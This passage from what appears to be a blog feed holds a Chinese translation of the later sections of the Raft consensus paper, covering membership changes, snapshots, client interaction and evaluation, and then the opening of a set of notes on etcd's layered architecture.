节中介绍的选举的超时时间限制；然后平均故障间隔时间就是对于一台服务器而言，两次故障之间的平均时间。广播时间必须比选举超时时间小一个量级，这样领导人才能够发送稳定的心跳消息来阻止跟随者开始进入选举状态；通过随机化选举超时时间的方法，这个不等式也使得选票瓜分的情况变得不可能。选举超时时间应该要比平均故障间隔时间小上几个数量级，这样整个系统才能稳定的运行。当领导人崩溃后，整个系统会大约相当于选举超时的时间里不可用；我们希望这种情况在整个系统的运行中很少出现。</p><p>广播时间和平均故障间隔时间是由系统决定的，但是选举超时时间是我们自己选择的。Raft 的 RPCs 需要接收方将信息持久化的保存到稳定存储中去，所以广播时间大约是 0.5 毫秒到 20 毫秒，取决于存储的技术。因此，选举超时时间可能需要在 10 毫秒到 500 毫秒之间。大多数的服务器的平均故障间隔时间都在几个月甚至更长，很容易满足时间的需求。</p><h2 id="6-集群成员变化"><a href="#6-集群成员变化" class="headerlink" title="6 集群成员变化"></a>6 集群成员变化</h2><p>到目前为止，我们都假设集群的配置（加入到一致性算法的服务器集合）是固定不变的。但是在实践中，偶尔是会改变集群的配置的，例如替换那些宕机的机器或者改变复制级别。尽管可以通过暂停整个集群，更新所有配置，然后重启整个集群的方式来实现，但是在更改的时候集群会不可用。另外，如果存在手工操作步骤，那么就会有操作失误的风险。为了避免这样的问题，我们决定自动化配置改变并且将其纳入到 Raft 一致性算法中来。</p><p>为了让配置修改机制能够安全，那么在转换的过程中不能够存在任何时间点使得两个领导人在同一个任期里同时被选举成功。不幸的是，任何服务器直接从旧的配置直接转换到新的配置的方案都是不安全的。一次性原子地转换所有服务器是不可能的，所以在转换期间整个集群存在划分成两个独立的大多数群体的可能性（见图 10）。</p><p><img src="/2022/10/01/raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/桌面\项目\开源项目\Reading-note\kuberneters\ETCD\images\raft-图10.png" alt="图 10"></p><blockquote><p>图 10：直接从一种配置转到新的配置是十分不安全的，因为各个机器可能在任何的时候进行转换。在这个例子中，集群配额从 3 台机器变成了 5 台。不幸的是，存在这样的一个时间点，两个不同的领导人在同一个任期里都可以被选举成功。一个是通过旧的配置，一个通过新的配置。</p></blockquote><p>为了保证安全性，配置更改必须使用两阶段方法。目前有很多种两阶段的实现。例如，有些系统在第一阶段停掉旧的配置所以集群就不能处理客户端请求；然后在第二阶段在启用新的配置。在 Raft 中，集群先切换到一个过渡的配置，我们称之为共同一致（<em>joint consensus</em>)；一旦共同一致已经被提交了，那么系统就切换到新的配置上。共同一致是老配置和新配置的结合：</p><ul><li>日志条目被复制给集群中新、老配置的所有服务器。</li><li>新、旧配置的服务器都可以成为领导人。</li><li>达成一致（针对选举和提交）需要分别在两种配置上获得大多数的支持。</li></ul><p>共同一致允许独立的服务器在不影响安全性的前提下，在不同的时间进行配置转换过程。此外，共同一致可以让集群在配置转换的过程中依然响应客户端的请求。</p><p>集群配置在复制日志中以特殊的日志条目来存储和通信；图 11 展示了配置转换的过程。当一个领导人接收到一个改变配置从 C-old 到 C-new 的请求，他会为了共同一致存储配置（图中的 C-old,new），以前面描述的日志条目和副本的形式。一旦一个服务器将新的配置日志条目增加到它的日志中，他就会用这个配置来做出未来所有的决定（服务器总是使用最新的配置，无论他是否已经被提交）。这意味着领导人要使用  C-old,new 的规则来决定日志条目 C-old,new 什么时候需要被提交。如果领导人崩溃了，被选出来的新领导人可能是使用 C-old 配置也可能是 C-old,new 配置，这取决于赢得选举的候选人是否已经接收到了 C-old,new 配置。在任何情况下， C-new 配置在这一时期都不会单方面的做出决定。</p><p>一旦 C-old,new 被提交，那么无论是 C-old 还是 C-new，如果不经过另一个配置的允许都不能单独做出决定，并且领导人完全特性保证了只有拥有 C-old,new 日志条目的服务器才有可能被选举为领导人。这个时候，领导人创建一条关于 C-new 配置的日志条目并复制给集群就是安全的了。再者，每个服务器在见到新的配置的时候就会立即生效。当新的配置在 C-new 的规则下被提交，旧的配置就变得无关紧要，同时不使用新的配置的服务器就可以被关闭了。如图 11，C-old 和 C-new 没有任何机会同时做出单方面的决定；这保证了安全性。</p><p><img src="/2022/10/01/raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/桌面\项目\开源项目\Reading-note\kuberneters\ETCD\images\raft-图11.png" alt="图 11"></p><blockquote><p>图 11：一个配置切换的时间线。虚线表示已经被创建但是还没有被提交的配置日志条目，实线表示最后被提交的配置日志条目。领导人首先创建了 C-old,new 的配置条目在自己的日志中，并提交到 C-old,new 中（C-old 的大多数和  C-new 的大多数）。然后他创建 C-new 条目并提交到 C-new 中的大多数。这样就不存在  C-new 和 C-old 可以同时做出决定的时间点。</p></blockquote><p>在关于重新配置还有三个问题需要提出。第一个问题是，新的服务器可能初始化没有存储任何的日志条目。当这些服务器以这种状态加入到集群中，那么他们需要一段时间来更新追赶，这时还不能提交新的日志条目。为了避免这种可用性的间隔时间，Raft 在配置更新之前使用了一种额外的阶段，在这个阶段，新的服务器以没有投票权身份加入到集群中来（领导人复制日志给他们，但是不考虑他们是大多数）。一旦新的服务器追赶上了集群中的其他机器，重新配置可以像上面描述的一样处理。</p><p>第二个问题是，集群的领导人可能不是新配置的一员。在这种情况下，领导人就会在提交了 C-new 日志之后退位（回到跟随者状态）。这意味着有这样的一段时间，领导人管理着集群，但是不包括他自己；他复制日志但是不把他自己算作是大多数之一。当 C-new 被提交时，会发生领导人过渡，因为这时是最早新的配置可以独立工作的时间点（将总是能够在 C-new 配置下选出新的领导人）。在此之前，可能只能从 C-old 中选出领导人。</p><p>第三个问题是，移除不在 C-new 中的服务器可能会扰乱集群。这些服务器将不会再接收到心跳，所以当选举超时，他们就会进行新的选举过程。他们会发送拥有新的任期号的请求投票 RPCs，这样会导致当前的领导人回退成跟随者状态。新的领导人最终会被选出来，但是被移除的服务器将会再次超时，然后这个过程会再次重复，导致整体可用性大幅降低。</p><p>为了避免这个问题，当服务器确认当前领导人存在时，服务器会忽略请求投票 RPCs。确切地说，当服务器在当前最小选举超时时间内收到一个请求投票 RPC，他不会更新当前的任期号或者投出选票。这不会影响正常的选举，每个服务器在开始一次选举之前，至少等待一个最小选举超时时间。然而，这有利于避免被移除的服务器扰乱：如果领导人能够发送心跳给集群，那么他就不会被更大的任期号废黜。</p><h2 id="7-日志压缩"><a href="#7-日志压缩" class="headerlink" title="7 日志压缩"></a>7 日志压缩</h2><p>Raft 的日志在正常操作中不断地增长，但是在实际的系统中，日志不能无限制地增长。随着日志不断增长，他会占用越来越多的空间，花费越来越多的时间来重置。如果没有一定的机制去清除日志里积累的陈旧的信息，那么会带来可用性问题。</p><p>快照是最简单的压缩方法。在快照系统中，整个系统的状态都以快照的形式写入到稳定的持久化存储中，然后到那个时间点之前的日志全部丢弃。快照技术被使用在 Chubby 和 ZooKeeper 中，接下来的章节会介绍 Raft 中的快照技术。</p><p>增量压缩的方法，例如日志清理或者日志结构合并树，都是可行的。这些方法每次只对一小部分数据进行操作，这样就分散了压缩的负载压力。首先，他们先选择一个已经积累的大量已经被删除或者被覆盖对象的区域，然后重写那个区域还活跃的对象，之后释放那个区域。和简单操作整个数据集合的快照相比，需要增加复杂的机制来实现。状态机可以实现 LSM tree 使用和快照相同的接口，但是日志清除方法就需要修改 Raft 了。</p><p><img src="/2022/10/01/raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/桌面\项目\开源项目\Reading-note\kuberneters\ETCD\images\raft-图12.png" alt="图 12"></p><blockquote><p>图 12：一个服务器用新的快照替换了从 1 到 5 的条目，快照值存储了当前的状态。快照中包含了最后的索引位置和任期号。</p></blockquote><p>图 12 展示了 Raft 中快照的基础思想。每个服务器独立地创建快照，只包括已经被提交的日志。主要的工作包括将状态机的状态写入到快照中。Raft 也包含一些少量的元数据到快照中：<strong>最后被包含索引</strong>指的是被快照取代的最后的条目在日志中的索引值（状态机最后应用的日志），<strong>最后被包含的任期</strong>指的是该条目的任期号。保留这些数据是为了支持快照后紧接着的第一个条目的附加日志请求时的一致性检查，因为这个条目需要前一日志条目的索引值和任期号。为了支持集群成员更新（第 6 节），快照中也将最后的一次配置作为最后一个条目存下来。一旦服务器完成一次快照，他就可以删除最后索引位置之前的所有日志和快照了。</p><p>尽管通常服务器都是独立地创建快照，但是领导人必须偶尔的发送快照给一些落后的跟随者。这通常发生在当领导人已经丢弃了下一条需要发送给跟随者的日志条目的时候。幸运的是这种情况不是常规操作：一个与领导人保持同步的跟随者通常都会有这个条目。然而一个运行非常缓慢的跟随者或者新加入集群的服务器（第 6 节）将不会有这个条目。这时让这个跟随者更新到最新的状态的方式就是通过网络把快照发送给他们。</p><p><strong>安装快照 RPC</strong>：</p><p>由领导人调用以将快照的分块发送给跟随者。领导人总是按顺序发送分块。</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>term</td><td>领导人的任期号</td></tr><tr><td>leaderId</td><td>领导人的 ID，以便于跟随者重定向请求</td></tr><tr><td>lastIncludedIndex</td><td>快照中包含的最后日志条目的索引值</td></tr><tr><td>lastIncludedTerm</td><td>快照中包含的最后日志条目的任期号</td></tr><tr><td>offset</td><td>分块在快照中的字节偏移量</td></tr><tr><td>data[]</td><td>从偏移量开始的快照分块的原始字节</td></tr><tr><td>done</td><td>如果这是最后一个分块则为 true</td></tr></tbody></table><table><thead><tr><th>结果</th><th>解释</th></tr></thead><tbody><tr><td>term</td><td>当前任期号（currentTerm），便于领导人更新自己</td></tr></tbody></table><p><strong>接收者实现</strong>：</p><ol><li>如果<code>term &lt; currentTerm</code>就立即回复</li><li>如果是第一个分块（offset 为 0）就创建一个新的快照</li><li>在指定偏移量写入数据</li><li>如果 done 是 false，则继续等待更多的数据</li><li>保存快照文件，丢弃具有较小索引的任何现有或部分快照</li><li>如果现存的日志条目与快照中最后包含的日志条目具有相同的索引值和任期号，则保留其后的日志条目并进行回复</li><li>丢弃整个日志</li><li>使用快照重置状态机（并加载快照的集群配置）</li></ol><p><img src="/2022/10/01/raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/桌面\项目\开源项目\Reading-note\kuberneters\ETCD\images\raft-图13.png" alt="图 13 "></p><blockquote><p>图 13：一个关于安装快照的简要概述。为了便于传输，快照都是被分成分块的；每个分块都给了跟随者生命的迹象，所以跟随者可以重置选举超时计时器。</p></blockquote><p>在这种情况下领导人使用一种叫做安装快照的新的 RPC 来发送快照给太落后的跟随者；见图 13。当跟随者通过这种  RPC 接收到快照时，他必须自己决定对于已经存在的日志该如何处理。通常快照会包含没有在接收者日志中存在的信息。在这种情况下，跟随者丢弃其整个日志；它全部被快照取代，并且可能包含与快照冲突的未提交条目。如果接收到的快照是自己日志的前面部分（由于网络重传或者错误），那么被快照包含的条目将会被全部删除，但是快照后面的条目仍然有效，必须保留。</p><p>这种快照的方式背离了 Raft 的强领导人原则，因为跟随者可以在不知道领导人情况下创建快照。但是我们认为这种背离是值得的。领导人的存在，是为了解决在达成一致性的时候的冲突，但是在创建快照的时候，一致性已经达成，这时不存在冲突了，所以没有领导人也是可以的。数据依然是从领导人传给跟随者，只是跟随者可以重新组织他们的数据了。</p><p>我们考虑过一种替代的基于领导人的快照方案，即只有领导人创建快照，然后发送给所有的跟随者。但是这样做有两个缺点。第一，发送快照会浪费网络带宽并且延缓了快照处理的时间。每个跟随者都已经拥有了所有产生快照需要的信息，而且很显然，自己从本地的状态中创建快照比通过网络接收别人发来的要经济。第二，领导人的实现会更加复杂。例如，领导人需要发送快照的同时并行的将新的日志条目发送给跟随者，这样才不会阻塞新的客户端请求。</p><p>还有两个问题影响了快照的性能。首先，服务器必须决定什么时候应该创建快照。如果快照创建的过于频繁，那么就会浪费大量的磁盘带宽和其他资源；如果创建快照频率太低，他就要承受耗尽存储容量的风险，同时也增加了从日志重建的时间。一个简单的策略就是当日志大小达到一个固定大小的时候就创建一次快照。如果这个阈值设置的显著大于期望的快照的大小，那么快照对磁盘压力的影响就会很小了。</p><p>第二个影响性能的问题就是写入快照需要花费显著的一段时间，并且我们还不希望影响到正常操作。解决方案是通过写时复制的技术，这样新的更新就可以被接收而不影响到快照。例如，具有函数式数据结构的状态机天然支持这样的功能。另外，操作系统的写时复制技术的支持（如 Linux 上的 fork）可以被用来创建完整的状态机的内存快照（我们的实现就是这样的）。</p><h2 id="8-客户端交互"><a href="#8-客户端交互" class="headerlink" title="8 客户端交互"></a>8 客户端交互</h2><p>这一节将介绍客户端是如何和 Raft 进行交互的，包括客户端如何发现领导人和 Raft 是如何支持线性化语义的。这些问题对于所有基于一致性的系统都存在，并且 Raft 的解决方案和其他的也差不多。</p><p>Raft 中的客户端发送所有请求给领导人。当客户端启动的时候，他会随机挑选一个服务器进行通信。如果客户端第一次挑选的服务器不是领导人，那么那个服务器会拒绝客户端的请求并且提供他最近接收到的领导人的信息（附加条目请求包含了领导人的网络地址）。如果领导人已经崩溃了，那么客户端的请求就会超时；客户端之后会再次重试随机挑选服务器的过程。</p><p>我们 Raft 的目标是要实现线性化语义（每一次操作立即执行，只执行一次，在他调用和收到回复之间）。但是，如上述，Raft 是可能执行同一条命令多次的：例如，如果领导人在提交了这条日志之后，但是在响应客户端之前崩溃了，那么客户端会和新的领导人重试这条指令，导致这条命令就被再次执行了。解决方案就是客户端对于每一条指令都赋予一个唯一的序列号。然后，状态机跟踪每条指令最新的序列号和相应的响应。如果接收到一条指令，它的序列号已经被执行了，那么就立即返回结果，而不重新执行指令。</p><p>只读的操作可以直接处理而不需要记录日志。但是，在不增加任何限制的情况下，这么做可能会冒着返回脏数据的风险，因为响应客户端请求的领导人可能在他不知道的时候已经被新的领导人取代了。线性化的读操作必须不能返回脏数据，Raft 需要使用两个额外的措施在不使用日志的情况下保证这一点。首先，领导人必须有关于被提交日志的最新信息。领导人完全特性保证了领导人一定拥有所有已经被提交的日志条目，但是在他任期开始的时候，他可能不知道哪些是已经被提交的。为了知道这些信息，他需要在他的任期里提交一条日志条目。Raft 中通过领导人在任期开始的时候提交一个空白的没有任何操作的日志条目到日志中去来实现。第二，领导人在处理只读的请求之前必须检查自己是否已经被废黜了（他自己的信息已经变脏了如果一个更新的领导人被选举出来）。Raft 中通过让领导人在响应只读请求之前，先和集群中的大多数节点交换一次心跳信息来处理这个问题。可选的，领导人可以依赖心跳机制来实现一种租约的机制，但是这种方法依赖时间来保证安全性（假设时间误差是有界的）。</p><h2 id="9-算法实现和评估"><a href="#9-算法实现和评估" class="headerlink" title="9 算法实现和评估"></a>9 算法实现和评估</h2><p>我们已经为 RAMCloud 实现了 Raft 算法作为存储配置信息的复制状态机的一部分，并且帮助 RAMCloud 协调故障转移。这个 Raft 实现包含大约 2000 行 C++ 代码，其中不包括测试、注释和空行。这些代码是开源的。同时也有大约 25 个其他独立的第三方的基于这篇论文草稿的开源实现，针对不同的开发场景。同时，很多公司已经部署了基于 Raft 的系统。</p><p>这一节会从三个方面来评估 Raft 算法：可理解性、正确性和性能。</p><h3 id="9-1-可理解性"><a href="#9-1-可理解性" class="headerlink" title="9.1 可理解性"></a>9.1 可理解性</h3><p>为了和 Paxos 比较 Raft 算法的可理解能力，我们针对高层次的本科生和研究生，在斯坦福大学的高级操作系统课程和加州大学伯克利分校的分布式计算课程上，进行了一次学习的实验。我们分别拍了针对 Raft 和 Paxos 的视频课程，并准备了相应的小测验。Raft 的视频讲课覆盖了这篇论文的所有内容除了日志压缩；Paxos 讲课包含了足够的资料来创建一个等价的复制状态机，包括单决策 Paxos，多决策 Paxos，重新配置和一些实际系统需要的性能优化（例如领导人选举）。小测验测试一些对算法的基本理解和解释一些边角的示例。每个学生都是看完第一个视频，回答相应的测试，再看第二个视频，回答相应的测试。大约有一半的学生先进行 Paxos 部分，然后另一半先进行 Raft 部分，这是为了说明两者从第一部分的算法学习中获得的表现和经验的差异。我们计算参加人员的每一个小测验的得分来看参与者是否在 Raft 算法上更加容易理解。</p><p>我们尽可能的使得 Paxos 和 Raft 的比较更加公平。这个实验偏爱 Paxos 表现在两个方面：43 个参加者中有 15 个人在之前有一些  Paxos 的经验，并且 Paxos 的视频要长 14%。如表格 1 总结的那样，我们采取了一些措施来减轻这种潜在的偏见。我们所有的材料都可供审查。</p><table><thead><tr><th>关心</th><th>缓和偏见采取的手段</th><th>可供查看的材料</th></tr></thead><tbody><tr><td>相同的讲课质量</td><td>两者使用同一个讲师。Paxos 使用的是现在很多大学里经常使用的。Paxos 会长 14%。</td><td>视频</td></tr><tr><td>相同的测验难度</td><td>问题以难度分组，在两个测验里成对出现。</td><td>小测验</td></tr><tr><td>公平评分</td><td>使用评价量规。随机顺序打分，两个测验交替进行。</td><td>评价量规（rubric）</td></tr></tbody></table><blockquote><p>表 1：考虑到可能会存在的偏见，对于每种情况的解决方法，和相应的材料。</p></blockquote><p>参加者平均在 Raft 的测验中比 Paxos 高 4.9 分（总分 60，那么 Raft 的平均得分是 25.7，而 Paxos 是 20.8）；图 14 展示了每个参与者的得分。配置t-检验（又称student‘s t-test）表明，在 95% 的可信度下，真实的 Raft 分数分布至少比 Paxos 高 2.5 分。</p><p><img src="/2022/10/01/raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/桌面\项目\开源项目\Reading-note\kuberneters\ETCD\images\raft-图14.png" alt="图 14"></p><blockquote><p>图 14：一个散点图表示了 43 个学生在 Paxos 和 Raft 的小测验中的成绩。在对角线之上的点表示在 Raft 获得了更高分数的学生。</p></blockquote><p>我们也建立了一个线性回归模型来预测一个新的学生的测验成绩，基于以下三个因素：他们使用的是哪个小测验，之前对 Paxos 的经验，和学习算法的顺序。模型预测，对小测验的选择会产生 12.5 分的差别。这显著的高于之前的 4.9 分，因为很多学生在之前都已经有了对于 Paxos 的经验，这相当明显的帮助 Paxos，对 Raft 就没什么太大影响了。但是奇怪的是，模型预测对于先进行 Paxos 小测验的人而言，Raft的得分低了6.3分; 虽然我们不知道为什么，这似乎在统计上是有意义的。</p><p>我们同时也在测验之后调查了参与者，他们认为哪个算法更加容易实现和解释；这个的结果在图 15 上。压倒性的结果表明 Raft 算法更加容易实现和解释（41 人中的 33个）。但是，这种自己报告的结果不如参与者的成绩更加可信，并且参与者可能因为我们的 Raft 更加易于理解的假说而产生偏见。</p><p><img src="/2022/10/01/raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/桌面\项目\开源项目\Reading-note\kuberneters\ETCD\images\raft-图15.png" alt="图 15"></p><blockquote><p>图 15：通过一个 5 分制的问题，参与者（左边）被问哪个算法他们觉得在一个高效正确的系统里更容易实现，右边被问哪个更容易向学生解释。</p></blockquote><p>关于 Raft 用户学习有一个更加详细的讨论。</p><h3 id="9-2-正确性"><a href="#9-2-正确性" class="headerlink" title="9.2 正确性"></a>9.2 正确性</h3><p>在第 5 节，我们已经制定了正式的规范，和对一致性机制的安全性证明。这个正式规范使用 TLA+ 规范语言使图 2 中总结的信息非常清晰。它长约400行，并作为证明的主题。同时对于任何想实现 Raft 的人也是十分有用的。我们通过 TLA 证明系统非常机械的证明了日志完全特性。然而，这个证明依赖的约束前提还没有被机械证明（例如，我们还没有证明规范的类型安全）。而且，我们已经写了一个非正式的证明关于状态机安全性是完备的，并且是相当清晰的（大约 3500 个词）。</p><h3 id="9-3-性能"><a href="#9-3-性能" class="headerlink" title="9.3 性能"></a>9.3 性能</h3><p>Raft 和其他一致性算法例如 Paxos 有着差不多的性能。在性能方面，最重要的关注点是，当领导人被选举成功时，什么时候复制新的日志条目。Raft 通过很少数量的消息包（一轮从领导人到集群大多数机器的消息）就达成了这个目的。同时，进一步提升 Raft 的性能也是可行的。例如，很容易通过支持批量操作和管道操作来提高吞吐量和降低延迟。对于其他一致性算法已经提出过很多性能优化方案；其中有很多也可以应用到 Raft 中来，但是我们暂时把这个问题放到未来的工作中去。</p><p>我们使用我们自己的 Raft 实现来衡量 Raft 领导人选举的性能并且回答两个问题。首先，领导人选举的过程收敛是否快速？第二，在领导人宕机之后，最小的系统宕机时间是多久？</p><p><img src="/2022/10/01/raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/桌面\项目\开源项目\Reading-note\kuberneters\ETCD\images\raft-图16.png" alt="图 16"></p><blockquote><p>图 16：发现并替换一个已经崩溃的领导人的时间。上面的图考察了在选举超时时间上的随机化程度，下面的图考察了最小选举超时时间。每条线代表了 1000 次实验（除了 150-150 毫秒只试了 100 次），和相应的确定的选举超时时间。例如，150-155 毫秒意思是，选举超时时间从这个区间范围内随机选择并确定下来。这个实验在一个拥有 5 个节点的集群上进行，其广播时延大约是 15 毫秒。对于 9 个节点的集群，结果也差不多。</p></blockquote><p>为了衡量领导人选举，我们反复的使一个拥有五个节点的服务器集群的领导人宕机，并计算需要多久才能发现领导人已经宕机并选出一个新的领导人（见图 16）。为了构建一个最坏的场景，在每一的尝试里，服务器都有不同长度的日志，意味着有些候选人是没有成为领导人的资格的。另外，为了促成选票瓜分的情况，我们的测试脚本在终止领导人之前同步的发送了一次心跳广播（这大约和领导人在崩溃前复制一个新的日志给其他机器很像）。领导人均匀的随机的在心跳间隔里宕机，也就是最小选举超时时间的一半。因此，最小宕机时间大约就是最小选举超时时间的一半。</p><p>图 16 中上面的图表明，只需要在选举超时时间上使用很少的随机化就可以大大避免选票被瓜分的情况。在没有随机化的情况下，在我们的测试里，选举过程往往都需要花费超过 10 秒钟由于太多的选票瓜分的情况。仅仅增加 5 毫秒的随机化时间，就大大的改善了选举过程，现在平均的宕机时间只有 287 毫秒。增加更多的随机化时间可以大大改善最坏情况：通过增加 50 毫秒的随机化时间，最坏的完成情况（1000 次尝试）只要 513 毫秒。</p><p>图 16 中下面的图显示，通过减少选举超时时间可以减少系统的宕机时间。在选举超时时间为 12-24 毫秒的情况下，只需要平均 35 毫秒就可以选举出新的领导人（最长的一次花费了 152 毫秒）。然而，进一步降低选举超时时间的话就会违反 Raft 的时间不等式需求：在选举新领导人之前，领导人就很难发送完心跳包。这会导致没有意义的领导人改变并降低了系统整体的可用性。我们建议使用更为保守的选举超时时间，比如 150-300 毫秒；这样的时间不大可能导致没有意义的领导人改变，而且依然提供不错的可用性。</p><h2 id="10-相关工作"><a href="#10-相关工作" class="headerlink" title="10 相关工作"></a>10 相关工作</h2><p>已经有很多关于一致性算法的工作被发表出来，其中很多都可以归到下面的类别中：</p><ul><li>Lamport 关于 Paxos 的原始描述，和尝试描述的更清晰。</li><li>关于 Paxos 的更详尽的描述，补充遗漏的细节并修改算法，使得可以提供更加容易的实现基础。</li><li>实现一致性算法的系统，例如 Chubby，ZooKeeper 和 Spanner。对于 Chubby 和 Spanner 的算法并没有公开发表其技术细节，尽管他们都声称是基于 Paxos 的。ZooKeeper 的算法细节已经发表，但是和 Paxos 着实有着很大的差别。</li><li>Paxos 可以应用的性能优化。</li><li>Oki 和 Liskov 的 Viewstamped Replication（VR），一种和 Paxos 差不多的替代算法。原始的算法描述和分布式传输协议耦合在了一起，但是核心的一致性算法在最近的更新里被分离了出来。VR 使用了一种基于领导人的方法，和 Raft 有很多相似之处。</li></ul><p>Raft 和 Paxos 最大的不同之处就在于 Raft 的强领导特性：Raft 使用领导人选举作为一致性协议里必不可少的部分，并且将尽可能多的功能集中到了领导人身上。这样就可以使得算法更加容易理解。例如，在 Paxos 中，领导人选举和基本的一致性协议是正交的：领导人选举仅仅是性能优化的手段，而且不是一致性所必须要求的。但是，这样就增加了多余的机制：Paxos 同时包含了针对基本一致性要求的两阶段提交协议和针对领导人选举的独立的机制。相比较而言，Raft 就直接将领导人选举纳入到一致性算法中，并作为两阶段一致性的第一步。这样就减少了很多机制。</p><p>像 Raft 一样，VR 和 ZooKeeper 也是基于领导人的，因此他们也拥有一些 Raft 的优点。但是，Raft 比 VR 和 ZooKeeper 拥有更少的机制因为 Raft 尽可能的减少了非领导人的功能。例如，Raft 中日志条目都遵循着从领导人发送给其他人这一个方向：附加条目 RPC 是向外发送的。在 VR 中，日志条目的流动是双向的（领导人可以在选举过程中接收日志）；这就导致了额外的机制和复杂性。根据 ZooKeeper 公开的资料看，它的日志条目也是双向传输的，但是它的实现更像 Raft。</p><p>和上述我们提及的其他基于一致性的日志复制算法中，Raft 的消息类型更少。例如，我们数了一下 VR 和 ZooKeeper 使用的用来基本一致性需要和成员改变的消息数（排除了日志压缩和客户端交互，因为这些都比较独立且和算法关系不大）。VR 和 ZooKeeper 都分别定义了 10 种不同的消息类型，相对的，Raft 只有 4 种消息类型（两种 RPC 请求和对应的响应）。Raft 的消息都稍微比其他算法的要信息量大，但是都很简单。另外，VR 和 ZooKeeper 都在领导人改变时传输了整个日志；所以为了能够实践中使用，额外的消息类型就很必要了。</p><p>Raft 的强领导人模型简化了整个算法，但是同时也排斥了一些性能优化的方法。例如，平等主义 Paxos （EPaxos）在某些没有领导人的情况下可以达到很高的性能。平等主义 Paxos 充分发挥了在状态机指令中的交换性。任何服务器都可以在一轮通信下就提交指令，除非其他指令同时被提出了。然而，如果指令都是并发的被提出，并且互相之间不通信沟通，那么 EPaxos 就需要额外的一轮通信。因为任何服务器都可以提交指令，所以 EPaxos 在服务器之间的负载均衡做的很好，并且很容易在 WAN 网络环境下获得很低的延迟。但是，他在 Paxos 上增加了非常明显的复杂性。</p><p>一些集群成员变换的方法已经被提出或者在其他的工作中被实现，包括 Lamport 的原始的讨论，VR 和 SMART。我们选择使用共同一致的方法因为他对一致性协议的其他部分影响很小，这样我们只需要很少的一些机制就可以实现成员变换。Lamport 的基于 α 的方法之所以没有被 Raft 选择是因为它假设在没有领导人的情况下也可以达到一致性。和 VR 和 SMART 相比较，Raft 的重新配置算法可以在不限制正常请求处理的情况下进行；相比较的，VR 需要停止所有的处理过程，SMART 引入了一个和 α 类似的方法，限制了请求处理的数量。Raft 的方法同时也需要更少的额外机制来实现，和 VR、SMART 比较而言。</p><h2 id="11-结论"><a href="#11-结论" class="headerlink" title="11 结论"></a>11 结论</h2><p>算法的设计通常会把正确性，效率或者简洁作为主要的目标。尽管这些都是很有意义的目标，但是我们相信，可理解性也是一样的重要。在开发者把算法应用到实际的系统中之前，这些目标没有一个会被实现，这些都会必然的偏离发表时的形式。除非开发人员对这个算法有着很深的理解并且有着直观的感觉，否则将会对他们而言很难在实现的时候保持原有期望的特性。</p><p>在这篇论文中，我们尝试解决分布式一致性问题，但是一个广为接受但是十分令人费解的算法 Paxos 已经困扰了无数学生和开发者很多年了。我们创造了一种新的算法 Raft，显而易见的比 Paxos 要容易理解。我们同时也相信，Raft 也可以为实际的实现提供坚实的基础。把可理解性作为设计的目标改变了我们设计 Raft 的方式；随着设计的进展，我们发现自己重复使用了一些技术，比如分解问题和简化状态空间。这些技术不仅提升了 Raft 的可理解性，同时也使我们坚信其正确性。</p><h2 id="12-感谢"><a href="#12-感谢" class="headerlink" title="12 感谢"></a>12 感谢</h2><p>这项研究必须感谢以下人员的支持：Ali Ghodsi，David Mazie`res，和伯克利 CS 294-91 课程、斯坦福 CS 240 课程的学生。Scott Klemmer 帮我们设计了用户调查，Nelson Ray 建议我们进行统计学的分析。在用户调查时使用的关于 Paxos 的幻灯片很大一部分是从 Lorenzo Alvisi 的幻灯片上借鉴过来的。特别的，非常感谢 DavidMazieres 和 Ezra Hoch，他们找到了 Raft 中一些难以发现的漏洞。许多人提供了关于这篇论文十分有用的反馈和用户调查材料，包括 Ed Bugnion，Michael Chan，Hugues Evrard，Daniel Giffin，Arjun Gopalan，Jon Howell，Vimalkumar Jeyakumar，Ankita Kejriwal，Aleksandar Kracun，Amit Levy，Joel Martin，Satoshi Matsushita，Oleg Pesok，David Ramos，Robbert van Renesse，Mendel Rosenblum，Nicolas Schiper，Deian Stefan，Andrew Stone，Ryan Stutsman，David Terei，Stephen Yang，Matei Zaharia 以及 24 位匿名的会议审查人员（可能有重复），并且特别感谢我们的领导人 Eddie Kohler。Werner Vogels 发了一条早期草稿链接的推特，给 Raft 带来了极大的关注。我们的工作由 Gigascale 系统研究中心和 Multiscale 系统研究中心给予支持，这两个研究中心由关注中心研究程序资金支持，一个是半导体研究公司的程序，由 STARnet 支持，一个半导体研究公司的程序由 MARCO 和 DARPA 支持，在国家科学基金会的 0963859 号批准，并且获得了来自 Facebook，Google，Mellanox，NEC，NetApp，SAP 和 Samsung 的支持。Diego Ongaro 由 Junglee 公司，斯坦福的毕业团体支持。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>略</p>]]></content>
    
    
    <categories>
      
      <category>raft</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
      <tag>raft</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>01.etcd基础架构</title>
    <link href="/2022/10/01/01.etcd%E5%9F%BA%E7%A1%80%E6%9E%B6%E6%9E%84/"/>
    <url>/2022/10/01/01.etcd%E5%9F%BA%E7%A1%80%E6%9E%B6%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<h1 id="ETCD基础架构"><a href="#ETCD基础架构" class="headerlink" title="ETCD基础架构"></a>ETCD基础架构</h1><blockquote><p>本文笔记来自：「极客时间ETCD实战课」，原文链接：<a href="https://time.geekbang.org/column/article/354292?cid=100069901">https://time.geekbang.org/column/article/354292?cid=100069901</a></p></blockquote><p>下面是一张 etcd 的简要基础架构图，我们先从宏观上了解一下 etcd 都有哪些功能模块。</p><p><img src="https://static001.geekbang.org/resource/image/34/84/34486534722d2748d8cd1172bfe63084.png?wh=1920*1240" alt="img"></p><p>可以看到，按照分层模型，etcd 可分为 Client 层、API 网络层、Raft 算法层、逻辑层和存储层。这些层的功能如下：</p><ul><li><strong>Client 层</strong>：Client 层包括 client v2 和 v3 两个大版本 API 客户端库，提供了简洁易用的 API，同时支持负载均衡、节点间故障自动转移，可极大降低业务使用 etcd 复杂度，提升开发效率、服务可用性。</li><li><strong>API 网络层</strong>：API 网络层主要包括 